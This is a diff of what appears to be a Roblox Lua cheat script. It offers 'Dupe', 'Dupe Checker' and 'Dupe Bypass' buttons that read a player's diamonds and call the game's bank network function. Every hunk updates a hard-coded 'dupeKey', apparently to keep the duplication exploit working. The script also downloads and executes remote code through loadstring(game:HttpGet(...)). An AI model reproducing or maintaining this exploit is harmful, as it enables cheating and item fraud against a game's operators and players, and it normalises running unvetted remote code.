@@ -5,7 +5,7 @@ require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Messa
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/IreXion-UI-Library/main/IreXion%20UI%20Library"))()
 
-local dupeKey = 2577326430
+local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
@@ -25,7 +25,7 @@ local Category = Tab:AddCategory("== Dupe ==")
 
 Category:AddButton("Start Dupe", function(dupe)
     
-local dupeKey = 2577326430
+local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
@@ -48,7 +48,7 @@ end)
 local Category = Tab:AddCategory("== Dupe Checker ==")
 
 Category:AddButton("Start Dupe Checker", function(dupe)
-    local dupeKey = 2577326430
+    local dupeKey = 599904916
     local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
@@ -70,7 +70,7 @@ end)
 local Category = Tab:AddCategory("== Dupe Bypass ==")
 
 Category:AddButton("Start Dupe Bypass", function(dupe)
-    local dupeKey = 2577326430
+    local dupeKey = 599904916
     local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
